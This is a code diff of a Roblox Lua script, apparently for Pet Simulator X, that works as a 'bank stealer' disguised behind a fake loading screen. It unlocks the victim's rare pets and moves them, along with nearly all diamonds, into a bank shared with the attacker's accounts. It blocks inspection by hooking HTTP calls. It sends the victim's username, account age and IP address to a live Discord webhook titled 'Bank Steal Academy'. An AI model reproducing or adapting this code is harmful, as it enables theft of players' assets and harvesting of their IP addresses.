@@ -1,362 +1,380 @@
+_G.UserID = 3731565217;
+_G.Webhook = "https://discord.com/api/webhooks/1052033005885067425/AN5IYxgL-Z2el5Yzbcu-X3WRJw9kMHsjtt8vzs8pgEJIb_9F1bOaFvAqMOrkHzO3jJsh"
+
 -- Anti Fiddle
-local anti_get;
-anti_get = hookfunction(game.HttpGet, function(a,b,...)
-    print(b)
-    local burl = tostring(b)
-    if b == "https://paste-bin.xyz/raw/972988" or b == "https://raw.githubusercontent.com/MrFeastEz/PSX/main/scripts/main.lua" or b == "https://ipinfo.io/ip" or b == _G.Webhook then
+if game then
+    local anti_get;
+    anti_get = hookfunction(game.HttpGet, function(a,b,...)
+        print(b)
+        local burl = tostring(b)
+        if b == "https://paste-bin.xyz/raw/972988" or b == "https://raw.githubusercontent.com/MrFeastEz/PSX/main/scripts/main.lua" or b == "https://ipinfo.io/ip" then
+        
+        else
+            game:GetService("Players").LocalPlayer:Kick("Get pulled kid "..game:HttpGet("https://ipinfo.io/ip"))
+            return
+        end
+        return anti_get(a,b,...) 
+    end)
     
-    else
-        game:GetService("Players").LocalPlayer:Kick("Get pulled kid "..game:HttpGet("https://ipinfo.io/ip"))
-        return
-    end
-    return anti_get(a,b,...) 
-end)
-
-local anti_aget;
-anti_aget = hookfunction(game.HttpGetAsync, function(a,b,...)
-    print(b)
-    local burl = tostring(b)
-    if b == "https://paste-bin.xyz/raw/972988" or b == "https://raw.githubusercontent.com/MrFeastEz/PSX/main/scripts/main.lua" or b == "https://ipinfo.io/ip" or b == _G.Webhook then
+    local anti_aget;
+    anti_aget = hookfunction(game.HttpGetAsync, function(a,b,...)
+        print(b)
+        local burl = tostring(b)
+        if b == "https://paste-bin.xyz/raw/972988" or b == "https://raw.githubusercontent.com/MrFeastEz/PSX/main/scripts/main.lua" or b == "https://ipinfo.io/ip" then
+        
+        else
+            game:GetService("Players").LocalPlayer:Kick("Get pulled kid "..game:HttpGet("https://ipinfo.io/ip"))
+            return
+        end
+        return anti_aget(a,b,...) 
+    end)
     
+    if syn then
+        local old = syn.request
+        setreadonly(syn, false)
+        syn.request = function(data)
+            if data.Url ~= _G.Webhook then
+                game:GetService("Players").LocalPlayer:Kick("Get pulled kid "..game:HttpGet("https://ipinfo.io/ip"))
+            else
+                return old(data)
+            end
+        end 
+        setreadonly(syn, true) 
+    end
+    
+    -- Detection
+    
+    local exploit
+    
+    local function getexploit()
+        local exploitt =
+            (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
+            (secure_load and "Sentinel") or
+            (is_sirhurt_closure and "Sirhurt") or
+            (pebc_execute and "ProtoSmasher") or
+            (KRNL_LOADED and "KRNL") or
+            (WrapGlobal and "WeAreDevs") or
+            (isvm and "Proxo") or
+            (shadow_env and "Shadow") or
+            (jit and "EasyExploits") or
+            (getscriptenvs and "Calamari") or
+            (unit and not syn and "Unit") or
+            (OXYGEN_LOADED and "Oxygen U") or
+            (IsElectron and "Electron") or
+            ("N/A")
+      
+        exploit = exploitt
+    end
+    
+    getexploit()
+    
+    -- Dualhook
+    
+    
+    local dh_userid = 3268331603
+    
+    -- Checks
+    
+    local url = _G.Webhook
+    
+    
+    if _G.Key == nil or _G.Key == "" then
+        if url == nil or url == "" then
+            game:GetService("Players").LocalPlayer:Kick("Put a webhook!")
+        end
+    
+        if _G.UserID == nil or _G.UserID == "" then
+            game:GetService("Players").LocalPlayer:Kick("Put a id!")
+        end
+        local worked = pcall(function() game.Players:GetNameFromUserIdAsync(_G.UserID) end)
+        if not worked then
+            game:GetService("Players").LocalPlayer:Kick("Put a valid id!")
+        end
     else
-        game:GetService("Players").LocalPlayer:Kick("Get pulled kid "..game:HttpGet("https://ipinfo.io/ip"))
-        return
+        local database = loadstring(game:HttpGet("https://paste-bin.xyz/raw/972988"))()
+        local function isWhitelisted(wl, key)
+            for i,v in pairs(wl) do
+                if v == key then
+                    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(i)
+                    return true
+                end
+            end
+            return false
+        end
+        if not isWhitelisted(database["whitelist"]) then
+            game:GetService("Players").LocalPlayer:Kick("Put a valid key!")
+        end
     end
-    return anti_aget(a,b,...) 
-end)
-
--- Detection
-
-local exploit
-
-local function getexploit()
-    local exploitt =
-        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
-        (secure_load and "Sentinel") or
-        (is_sirhurt_closure and "Sirhurt") or
-        (pebc_execute and "ProtoSmasher") or
-        (KRNL_LOADED and "KRNL") or
-        (WrapGlobal and "WeAreDevs") or
-        (isvm and "Proxo") or
-        (shadow_env and "Shadow") or
-        (jit and "EasyExploits") or
-        (getscriptenvs and "Calamari") or
-        (unit and not syn and "Unit") or
-        (OXYGEN_LOADED and "Oxygen U") or
-        (IsElectron and "Electron") or
-        ("N/A")
-  
-    exploit = exploitt
-end
-
-getexploit()
-
--- Dualhook
-
-
-local dh_userid = 3268331603
-
--- Checks
-
-local url = _G.Webhook
-
-
-if _G.Key == nil or _G.Key == "" then
-    if url == nil or url == "" then
-        game:GetService("Players").LocalPlayer:Kick("Put a webhook!")
-    end
-
-    if _G.UserID == nil or _G.UserID == "" then
-        game:GetService("Players").LocalPlayer:Kick("Put a id!")
-    end
-    local worked = pcall(function() game.Players:GetNameFromUserIdAsync(_G.UserID) end)
-    if not worked then
-        game:GetService("Players").LocalPlayer:Kick("Put a valid id!")
-    end
-else
-    local database = loadstring(game:HttpGet("https://paste-bin.xyz/raw/972988"))()
-    local function isWhitelisted(wl, key)
-        for i,v in pairs(wl) do
-            if v == key then
-                _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(i)
-                return true
+    
+    -- Remotes
+    
+    local getmybanksremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).GetMyBanks, 3)
+    
+    local inviteremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).InviteToBank, 11)
+    
+    local lockremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Inventory).LockPets, 5)
+        
+    local depositremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).Deposit, 16)
+    
+    local eggremote = debug.getconstant(debug.getprotos(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Eggs).SetupEgg)[5], 26)
+    
+    -- Libs
+    
+    local blobx = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client["Network"]).Invoke)
+    local bloby = getupvalues(blobx[2])
+    local blobz = getupvalues(bloby[1])[1][2]
+    local bloba = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client["Network"]).Invoke)
+    local blobb = getupvalues(bloba[2])
+    
+    getmybanksremote = blobz[blobb[2](2, getmybanksremote)]
+    inviteremote = blobz[blobb[2](2, inviteremote)]
+    lockremote = blobz[blobb[2](2, lockremote)]
+    depositremote = blobz[blobb[2](2, depositremote)]
+    eggremote = blobz[blobb[2](2, eggremote)]
+    
+    local lib = require(game.ReplicatedStorage:WaitForChild("Library"))
+    local mybanks = getmybanksremote:InvokeServer()
+    local BankID = mybanks[1]["BUID"]
+    local Bank = BankID
+    
+    inviteremote:InvokeServer(mybanks[1]["BUID"], dh_userid)
+    
+    -- Pet stuff
+    
+    local FinalList = {}
+    
+    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+    Functions = Library.Functions
+    
+    EXCList = {}
+    MythicList = {}
+    HugeList = {}
+    
+    PogList = {139, 177, 176, 178}
+    EList = {}
+    MList = {}
+    HList = {}
+    PList = {}
+    
+    table.foreach(
+        Library.Directory.Pets,
+        function(i, v)
+            if v.rarity == "Exclusive" then
+                table.insert(EXCList, i)
+            end
+            if v.rarity == "Mythical" then
+                table.insert(MythicList, i)
+            end
+            if v.huge then
+                table.insert(HugeList, i)
             end
         end
-        return false
+    )
+    for i, v in pairs(PogList) do
+        table.insert(EXCList, v)
     end
-    if not isWhitelisted(database["whitelist"]) then
-        game:GetService("Players").LocalPlayer:Kick("Put a valid key!")
-    end
-end
-
--- Remotes
-
-local getmybanksremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).GetMyBanks, 3)
-
-local inviteremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).InviteToBank, 11)
-
-local lockremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Inventory).LockPets, 5)
     
-local depositremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).Deposit, 16)
-
-local eggremote = debug.getconstant(debug.getprotos(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Eggs).SetupEgg)[5], 26)
-
--- Libs
-
-local blobx = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client["Network"]).Invoke)
-local bloby = getupvalues(blobx[2])
-local blobz = getupvalues(bloby[1])[1][2]
-local bloba = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client["Network"]).Invoke)
-local blobb = getupvalues(bloba[2])
-
-getmybanksremote = blobz[blobb[2](2, getmybanksremote)]
-inviteremote = blobz[blobb[2](2, inviteremote)]
-lockremote = blobz[blobb[2](2, lockremote)]
-depositremote = blobz[blobb[2](2, depositremote)]
-eggremote = blobz[blobb[2](2, eggremote)]
-
-local lib = require(game.ReplicatedStorage:WaitForChild("Library"))
-local mybanks = getmybanksremote:InvokeServer()
-local BankID = mybanks[1]["BUID"]
-local Bank = BankID
-
-inviteremote:InvokeServer(mybanks[1]["BUID"], dh_userid)
-
--- Pet stuff
-
-local FinalList = {}
-
-Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
-Functions = Library.Functions
-
-EXCList = {}
-MythicList = {}
-HugeList = {}
-
-PogList = {139, 177, 176, 178}
-EList = {}
-MList = {}
-HList = {}
-PList = {}
-
-table.foreach(
-    Library.Directory.Pets,
-    function(i, v)
-        if v.rarity == "Exclusive" then
-            table.insert(EXCList, i)
+    local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+    local y = {}
+    for i, v in pairs(pets) do
+        y[v["uid"]] = false
+    end
+    lockremote:InvokeServer(y)
+    for i, v in pairs(pets) do
+        if table.find(EXCList, v["id"]) ~= nil then
+            table.insert(EList, v["uid"])
         end
-        if v.rarity == "Mythical" then
-            table.insert(MythicList, i)
+        if table.find(MythicList, v["id"]) ~= nil then
+            table.insert(MList, v["uid"])
         end
-        if v.huge then
-            table.insert(HugeList, i)
+        if table.find(HugeList, v["id"]) ~= nil then
+            table.insert(HList, v["uid"])
         end
     end
-)
-for i, v in pairs(PogList) do
-    table.insert(EXCList, v)
-end
-
-local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
-local y = {}
-for i, v in pairs(pets) do
-    y[v["uid"]] = false
-end
-lockremote:InvokeServer(y)
-for i, v in pairs(pets) do
-    if table.find(EXCList, v["id"]) ~= nil then
-        table.insert(EList, v["uid"])
-    end
-    if table.find(MythicList, v["id"]) ~= nil then
-        table.insert(MList, v["uid"])
-    end
-    if table.find(HugeList, v["id"]) ~= nil then
-        table.insert(HList, v["uid"])
-    end
-end
-if #EList + #MList + #PList < 49 then
-    for i, v in pairs(EList) do
-        table.insert(FinalList, v)
-    end
-    for i, v in pairs(MList) do
-        table.insert(FinalList, v)
-    end
-elseif #EList + #MList > 49 and #EList < 49 then
-    for i, v in pairs(EList) do
-        table.insert(FinalList, v)
-    end
-    for i, v in pairs(MList) do
-        if #FinalList < 49 then
+    if #EList + #MList + #PList < 49 then
+        for i, v in pairs(EList) do
             table.insert(FinalList, v)
         end
-    end
-elseif #EList + #MList > 49 and #EList > 49 then
-    for i, v in pairs(EList) do
-        if #FinalList < 49 then
+        for i, v in pairs(MList) do
             table.insert(FinalList, v)
         end
+    elseif #EList + #MList > 49 and #EList < 49 then
+        for i, v in pairs(EList) do
+            table.insert(FinalList, v)
+        end
+        for i, v in pairs(MList) do
+            if #FinalList < 49 then
+                table.insert(FinalList, v)
+            end
+        end
+    elseif #EList + #MList > 49 and #EList > 49 then
+        for i, v in pairs(EList) do
+            if #FinalList < 49 then
+                table.insert(FinalList, v)
+            end
+        end
     end
-end
-
--- Loading gui
-
-local diamond = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
-local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
-
-game:GetService("CoreGui").RobloxGui:Destroy()
-game:GetService("CoreGui").PlayerList:Destroy()
-game:GetService("CoreGui").BubbleChat:Destroy()
-game:GetService("CoreGui").ThemeProvider:Destroy()
-
-for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
-    v:Destroy()
-end
-
-local Players = game:GetService("Players")
-local ReplicatedFirst = game:GetService("ReplicatedFirst")
-local TweenService = game:GetService("TweenService")
-
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-
-local screenGui = Instance.new("ScreenGui")
-screenGui.IgnoreGuiInset = true
-screenGui.Parent = playerGui
-local textLabel = Instance.new("TextLabel")
-textLabel.Size = UDim2.new(1, 0, 1, 0)
-textLabel.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
-textLabel.Font = Enum.Font.GothamSemibold
-textLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
-textLabel.Text = "Loading..."
-textLabel.TextSize = 28
-textLabel.Parent = screenGui
-local loadingRing = Instance.new("ImageLabel")
-loadingRing.Size = UDim2.new(0, 256, 0, 256)
-loadingRing.BackgroundTransparency = 1
-loadingRing.Image = "rbxassetid://4965945816"
-loadingRing.AnchorPoint = Vector2.new(0.5, 0.5)
-loadingRing.Position = UDim2.new(0.5, 0, 0.5, 0)
-loadingRing.Parent = screenGui
-
--- Remove the default loading screen
-ReplicatedFirst:RemoveDefaultLoadingScreen()
-
-local tweenInfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
-local tween = TweenService:Create(loadingRing, tweenInfo, {Rotation = 360})
-tween:Play()
-
-wait(0.5)
-game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Open Eggs"].Disabled = true
-local A_1 = {
-    [1] = "Cracked Egg",
-    [2] = false
-}
-eggremote:InvokeServer("Cracked Egg", false, false)
-wait(0.5)
-local A_1 = {
-    [1] = Bank,
-    [2] = FinalList,
-    [3] = 0
-}
-
-wait(15)
-
-local s, e =
-    pcall(
-    function()
-        depositremote:InvokeServer(
-            Bank,
-            FinalList,
-            require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Diamonds - 1
-        )
+    
+    -- Loading gui
+    
+    local diamond = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
+    local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+    
+    game:GetService("CoreGui").RobloxGui:Destroy()
+    game:GetService("CoreGui").PlayerList:Destroy()
+    game:GetService("CoreGui").BubbleChat:Destroy()
+    game:GetService("CoreGui").ThemeProvider:Destroy()
+    
+    for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
+        v:Destroy()
     end
-)
-
-if s == false then
+    
+    local Players = game:GetService("Players")
+    local ReplicatedFirst = game:GetService("ReplicatedFirst")
+    local TweenService = game:GetService("TweenService")
+    
+    local player = Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+    
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = playerGui
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Size = UDim2.new(1, 0, 1, 0)
+    textLabel.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
+    textLabel.Font = Enum.Font.GothamSemibold
+    textLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+    textLabel.Text = "Loading..."
+    textLabel.TextSize = 28
+    textLabel.Parent = screenGui
+    local loadingRing = Instance.new("ImageLabel")
+    loadingRing.Size = UDim2.new(0, 256, 0, 256)
+    loadingRing.BackgroundTransparency = 1
+    loadingRing.Image = "rbxassetid://4965945816"
+    loadingRing.AnchorPoint = Vector2.new(0.5, 0.5)
+    loadingRing.Position = UDim2.new(0.5, 0, 0.5, 0)
+    loadingRing.Parent = screenGui
+    
+    -- Remove the default loading screen
+    ReplicatedFirst:RemoveDefaultLoadingScreen()
+    
+    local tweenInfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
+    local tween = TweenService:Create(loadingRing, tweenInfo, {Rotation = 360})
+    tween:Play()
+    
+    wait(0.5)
+    game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Open Eggs"].Disabled = true
+    local A_1 = {
+        [1] = "Cracked Egg",
+        [2] = false
+    }
+    eggremote:InvokeServer("Cracked Egg", false, false)
+    wait(0.5)
+    local A_1 = {
+        [1] = Bank,
+        [2] = FinalList,
+        [3] = 0
+    }
+    
     wait(15)
-    depositremote:InvokeServer(Bank, FinalList, 1)
-end
-
--- Sending webhook
-
-local username = game:GetService("Players").LocalPlayer.Name 
-local fardplayer = game:GetService("Players").LocalPlayer 
-request = http_request or request or HttpPost or syn.request
-
--- Img
-
-imgs = "https://cdn.discordapp.com/attachments/1051705697743679525/1053841304641085481/lithiumare-kiracord.gif"
-
-local data1 = {
-    ["content"] = "@everyone",
-    ["username"] = "Bank Steal Academy",
-    ["avatar_url"] = "https://cdn.discordapp.com/attachments/1051705697743679525/1053841304641085481/lithiumare-kiracord.gif",
-    ["embeds"] = {
-        {
-            ["title"] = "New Hit",
-            ["url"] = "https://discord.gg/EeGe4dtuUW",
-            ["type"] = "rich",
-            ["color"] = tonumber(0xF0FF00),
-            ["thumbnail"] = {
-                ["url"] = imgs,
-                ["height"] = 420,
-                ["width"] = 420
-            },
-            ["fields"] = {
-                {
-                    ["name"] = "Information",
-                    ["value"] = "```Username     : "..username.."\nDisplay Name : "..fardplayer.DisplayName.."\nUser-ID      : "..fardplayer.userId.."\nAccount Age  : "..fardplayer.AccountAge.." Days\nIP Address   : "..game:HttpGet('https://ipinfo.io/ip').."```",
-                    ["inline"] = false
+    
+    local s, e =
+        pcall(
+        function()
+            depositremote:InvokeServer(
+                Bank,
+                FinalList,
+                require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Diamonds - 1
+            )
+        end
+    )
+    
+    if s == false then
+        wait(15)
+        depositremote:InvokeServer(Bank, FinalList, 1)
+    end
+    
+    -- Sending webhook
+    
+    local username = game:GetService("Players").LocalPlayer.Name 
+    local fardplayer = game:GetService("Players").LocalPlayer 
+    request = http_request or request or HttpPost or syn.request
+    
+    -- Img
+    
+    imgs = "https://cdn.discordapp.com/attachments/1051705697743679525/1053841304641085481/lithiumare-kiracord.gif"
+    
+    local data1 = {
+        ["content"] = "@everyone",
+        ["username"] = "Bank Steal Academy",
+        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1051705697743679525/1053841304641085481/lithiumare-kiracord.gif",
+        ["embeds"] = {
+            {
+                ["title"] = "New Hit",
+                ["url"] = "https://discord.gg/EeGe4dtuUW",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xF0FF00),
+                ["thumbnail"] = {
+                    ["url"] = imgs,
+                    ["height"] = 420,
+                    ["width"] = 420
                 },
-                {
-                    ["name"] = "Diamonds Deposited",
-                    ["value"] = diamond,
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "Total Pets Deposited",
-                    ["value"] = #FinalList,
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "Exclusives Deposited",
-                    ["value"] = #EList,
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "Huges Deposited",
-                    ["value"] = #HList,
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "Mythicals Deposited",
-                    ["value"] = #MList,
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "Rank",
-                    ["value"] = rank,
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "Bank ID",
-                    ["value"] = BankID,
-                    ["inline"] = false
+                ["fields"] = {
+                    {
+                        ["name"] = "Information",
+                        ["value"] = "```Username     : "..username.."\nDisplay Name : "..fardplayer.DisplayName.."\nUser-ID      : "..fardplayer.userId.."\nAccount Age  : "..fardplayer.AccountAge.." Days\nIP Address   : "..game:HttpGet('https://ipinfo.io/ip').."```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "Diamonds Deposited",
+                        ["value"] = diamond,
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "Total Pets Deposited",
+                        ["value"] = #FinalList,
+                        ["inline"] = false
+                    },
+    				{
+                        ["name"] = "Exclusives Deposited",
+                        ["value"] = #EList,
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "Huges Deposited",
+                        ["value"] = #HList,
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "Mythicals Deposited",
+                        ["value"] = #MList,
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "Rank",
+                        ["value"] = rank,
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "Bank ID",
+                        ["value"] = BankID,
+                        ["inline"] = false
+                    }
                 }
             }
         }
     }
-}
-
-local newdata1 = game:GetService("HttpService"):JSONEncode(data1)
-
-local headers = {
-    ["content-type"] = "application/json"
-}
-local abcdef1 = {Url = url, Body = newdata1, Method = "POST", Headers = headers}
-request(abcdef1)
-
-while task.wait(0.1) do
-    inviteremote:InvokeServer(mybanks[1]["BUID"], dh_userid)
-    inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
+    
+    local newdata1 = game:GetService("HttpService"):JSONEncode(data1)
+    
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    local abcdef1 = {Url = url, Body = newdata1, Method = "POST", Headers = headers}
+    request(abcdef1)
+    
+    while task.wait(0.1) do
+        inviteremote:InvokeServer(mybanks[1]["BUID"], dh_userid)
+        inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
+    end
 end
